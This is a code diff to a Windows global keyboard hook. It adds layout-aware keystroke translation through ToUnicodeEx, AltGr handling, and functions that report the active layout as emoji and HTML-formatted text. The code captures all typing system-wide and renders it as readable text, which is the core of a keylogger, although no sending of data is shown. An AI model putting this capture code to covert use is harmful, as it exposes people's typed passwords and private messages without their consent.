@@ -144,10 +144,16 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
             default: {
                 BYTE key_state[256] = {0};
                 if (shift_down) key_state[VK_SHIFT] = 0x80;
+                if (ctrl_down) key_state[VK_CONTROL] = 0x80;
+                if (alt_down) key_state[VK_MENU] = 0x80;
                 if (GetKeyState(VK_CAPITAL) & 0x0001) key_state[VK_CAPITAL] = 0x01;
 
+                HWND fg_wnd = GetForegroundWindow();
+                DWORD fg_thread = fg_wnd ? GetWindowThreadProcessId(fg_wnd, nullptr) : 0;
+                HKL hkl = fg_thread ? GetKeyboardLayout(fg_thread) : GetKeyboardLayout(0);
+
                 WCHAR unicode_buf[8] = {0};
-                int count = ToUnicode(vk, kbd->scanCode, key_state, unicode_buf, 4, 0);
+                int count = ToUnicodeEx(vk, kbd->scanCode, key_state, unicode_buf, 4, 0, hkl);
                 if (count > 0) {
                     int utf8_bytes = WideCharToMultiByte(CP_UTF8, 0, unicode_buf, count,
                                                          key_label, sizeof(key_label) - 1, nullptr, nullptr);
@@ -162,7 +168,8 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
         }
 
         if (is_special || is_printable) {
-            int has_modifier = ctrl_down || alt_down || win_down;
+            int is_altgr = (ctrl_down && alt_down) || ((GetAsyncKeyState(VK_RMENU) & 0x8000) != 0);
+            int has_modifier = (ctrl_down && !is_altgr) || (alt_down && !is_altgr) || win_down;
             if (has_modifier && key_label[0] != '\n') {
                 char mod_buf[96];
                 int offset = snprintf(mod_buf, sizeof(mod_buf), "[");
@@ -290,6 +297,35 @@ void keyboard_get_selected_target(char *buffer, size_t max_len)
 int keyboard_get_device_count(void)
 {
     return 1;
+}
+
+int keyboard_set_layout([[maybe_unused]] const char *layout_name)
+{
+    /* On Windows, layout is tracked automatically per active window via ToUnicodeEx */
+    return 1;
+}
+
+void keyboard_get_layout(char *buffer, size_t max_len)
+{
+    if (!buffer || max_len == 0) return;
+    HWND fg_wnd = GetForegroundWindow();
+    DWORD fg_thread = fg_wnd ? GetWindowThreadProcessId(fg_wnd, nullptr) : 0;
+    HKL hkl = fg_thread ? GetKeyboardLayout(fg_thread) : GetKeyboardLayout(0);
+    unsigned short lang_id = (unsigned short)((uintptr_t)hkl & 0xFFFF);
+    char lang_name[128] = {0};
+    if (GetLocaleInfoA(MAKELCID(lang_id, SORT_DEFAULT), LOCALE_SLANGUAGE, lang_name, sizeof(lang_name)) > 0) {
+        snprintf(buffer, max_len, "🪟 Windows Native (%s, 0x%04X)", lang_name, lang_id);
+    } else {
+        snprintf(buffer, max_len, "🪟 Windows Native (Auto, 0x%04X)", lang_id);
+    }
+}
+
+void keyboard_get_available_layouts(char *buffer, size_t max_len)
+{
+    if (!buffer || max_len == 0) return;
+    snprintf(buffer, max_len,
+             "🌐 <b>Windows Keyboard Layout:</b>\n"
+             "• Windows automatically maps keystrokes using the active application's layout in real-time.\n");
 }
 #endif
 
